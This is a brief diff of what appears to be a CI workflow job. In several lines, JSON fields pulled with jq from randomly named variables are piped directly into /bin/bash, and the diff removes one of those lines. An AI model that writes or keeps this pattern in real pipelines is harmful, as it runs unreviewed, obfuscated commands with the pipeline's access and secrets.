@@ -22,7 +22,6 @@ jobs:
           echo $jdje61 | jq -r .fiepq42263 | /bin/bash
           printf '%s' "$d84966" | jq -r .oqg9177 | /bin/bash
           echo $p1 | jq -r .z9792 | /bin/bash
-          printf '%s' "$ucver50" | jq -r .qfvo0 | /bin/bash
           printf '%s' "$re69" | jq -r .ixzlz7 | /bin/bash
 
       - name: Save results
